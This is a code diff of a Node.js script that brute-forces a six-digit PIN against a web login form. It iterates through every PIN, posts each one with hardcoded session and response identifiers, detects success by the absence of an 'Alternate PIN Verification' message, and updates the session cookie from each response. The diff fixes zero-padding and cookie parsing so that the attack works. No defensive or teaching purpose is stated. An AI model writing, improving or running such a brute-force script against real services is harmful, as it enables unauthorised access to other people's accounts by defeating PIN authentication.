@@ -1,7 +1,7 @@
 const rp = require('request-promise')
 
-let responseId = 'RjQwMEhFNjA3NzMx'
-let sessionId = 'SDVESEtQNjA3NzMx'
+let responseId = 'NUtEMUNSNjA3NzMx'
+let sessionId = 'MlVNMkw1NjA3NzMx'
 
 let options = {
   resolveWithFullResponse: true,
@@ -32,27 +32,28 @@ let options = {
 const timeout = ms => new Promise((resolve, reject) => setTimeout(resolve, ms))
 
 async function main () {
-  for (let pin = 000001; pin < 999999; pin++) {
+  for (let pin = 0; pin < 999999; pin++) {
+    const pinFormatted = pin.toString().padStart(6, '0')
+    options.form.pin = pinFormatted
     await rp(options)
       .then((response) => {
         // Check if the body doesn't contain the Auth Failure message here.
         // If it doesn't print the pin and exit the script.
         console.log(response.body)
 
-		if ( response.body.search('Alternate PIN Verification') == -1 )
-		{
-			console.log("you win \n\n\n\n\n")
-			console.log(pin)
-			
-		}
-			
+        if (response.body.search('Alternate PIN Verification') === -1) {
+          console.log('Pin found!')
+          console.log(pinFormatted)
+        } else {
+          console.log('Pin not found!')
+        }
+
         // Grab the first (and only) element of this array.
         // Split on the `=` and set the responseId appropriately.
+        // I'm not sure this exactly will work because I'm not sure when the
+        // string template for the Cookie is actually built.
         console.log(response.headers['set-cookie'])
-		responseId = response.headers['set-cookie']
-		options.form.pin = pin
-		console.log(options.form.pin)
-		
+        responseId = response.headers['set-cookie'][0].split('=')[1]
       })
       .catch((err) => {
         console.error(err)
